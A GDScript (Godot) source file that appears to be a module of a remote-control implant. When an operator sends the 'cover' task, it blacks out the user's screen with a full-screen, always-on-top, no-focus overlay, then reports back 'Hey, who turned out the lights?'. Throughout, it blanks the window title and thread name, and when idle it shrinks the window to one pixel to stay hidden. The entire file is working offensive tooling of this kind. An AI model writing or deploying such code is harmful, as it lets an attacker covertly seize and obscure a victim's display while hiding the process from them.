extends Node

var display_size
var gui
var task_id

func _ready():
	display_size = Vector2(1024,768)

	gui = $".".get_node("CoverGUI")
	hide()

func show():
	get_window().set_title("")
	var _donotcare = OS.set_thread_name("")
	var screen_size = DisplayServer.screen_get_size(0)

	DisplayServer.window_set_mode(DisplayServer.WINDOW_MODE_WINDOWED)
	DisplayServer.window_set_position(Vector2i(0,0), 0)
	DisplayServer.window_set_size(screen_size, 0)

	DisplayServer.window_set_exclusive(0, true)
	DisplayServer.window_set_flag(DisplayServer.WINDOW_FLAG_ALWAYS_ON_TOP, true, 0)
	DisplayServer.window_set_flag(DisplayServer.WINDOW_FLAG_BORDERLESS, true, 0)
	DisplayServer.window_set_flag(DisplayServer.WINDOW_FLAG_NO_FOCUS, true, 0)
	DisplayServer.window_set_flag(DisplayServer.WINDOW_FLAG_TRANSPARENT, true, 0)
	gui.get_node("ColorRect").custom_minimum_size = Vector2(screen_size.x+screen_size.x/2, screen_size.y+screen_size.y/2)

	gui.show()
	gui.visible = true

func hide():
	gui.hide()

	DisplayServer.window_set_mode(DisplayServer.WINDOW_MODE_MINIMIZED)
	DisplayServer.window_set_size(Vector2i(0,0), 0)

	get_window().set_title("")
	var _donotcare = OS.set_thread_name("")
	get_window().size = Vector2(1,1)
	gui.position = Vector2(-1,-1)

func _on_tasking_cover(transport, task):

	var test_json_conv = JSON.new()
	test_json_conv.parse(task.get("parameters"))
	var parameters = test_json_conv.get_data()
	var state = float(parameters.get("state"))
	var output = "Cover Hidden"

	if state == 0:
		hide()
	else:
		show()
		output = "Cover Active - Hey, who turned out the lights?"

	transport.send(
		transport.create_task_response(
			true,
			false,
			task.get("id"),
			output,
		)
	)
